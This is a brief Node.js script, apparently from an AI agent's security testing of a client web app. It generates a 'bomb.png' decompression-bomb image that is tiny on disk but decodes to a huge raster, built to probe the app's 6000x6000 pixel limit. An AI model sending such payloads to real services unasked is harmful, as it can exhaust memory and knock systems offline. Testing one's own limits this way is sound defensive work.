import sharp from 'sharp';
import fs from 'fs';

// Solid-color PNG at a large pixel count but under sharp's default 268,402,689px cap.
// PNG compresses a flat color extremely well -> tiny file, huge decoded raster.
const W = 10000, H = 10000; // 100,000,000 px -- 2.8x over the app's own 6000x6000 (36M px) policy
const buf = await sharp({
  create: { width: W, height: H, channels: 3, background: { r: 10, g: 200, b: 80 } }
}).png({ compressionLevel: 9 }).toBuffer();

fs.writeFileSync('/private/tmp/claude-501/-Users-apple-Documents-CLIENTES-grupoGh-appGrupogh/28c6179f-065e-4a03-9164-ab016d5dd4d2/scratchpad/bomb.png', buf);
console.log('bomb.png bytes:', buf.length, '(', (buf.length/1024).toFixed(1), 'KB )');
console.log('pixels:', W*H, 'raw RGBA bytes if decoded:', W*H*4, '(', (W*H*4/1024/1024/1024).toFixed(2), 'GB )');
